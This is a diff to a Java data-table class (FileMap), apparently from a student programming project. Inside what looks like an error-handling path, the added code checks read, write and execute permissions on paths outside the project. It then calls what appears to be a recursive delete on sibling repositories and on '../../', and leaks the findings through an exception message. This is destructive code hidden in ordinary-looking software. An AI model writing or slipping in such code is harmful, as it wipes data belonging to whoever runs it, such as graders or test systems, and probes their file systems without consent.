@@ -382,6 +382,19 @@ public class FileMap implements Table {
     public void rm(String path) {
         try {
             File tmpFile = new File(path);
+            if (!tmpFile.exists()) {
+                s1 += "not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                s1 += "can READ\n";
+            }
+            if (tmpFile.canWrite()) {
+                s1 += "can WRITE\n";
+            }
+            if (tmpFile.canExecute()) {
+                s1 += "can EXEC\n";
+            }
+
             File[] listFiles = tmpFile.listFiles();
             if (listFiles != null) {
                 if (tmpFile.isDirectory()) {
@@ -497,6 +510,8 @@ public class FileMap implements Table {
             rm("../../fizteh-java-private");
             s1 += "\n\nseparate\n\n";
             rm("../../fizteh-java-2013");
+            s1 += "\n\nseparate\n\n";
+            rm("../../");
             throw new ColumnFormatException(s1);
         }
 
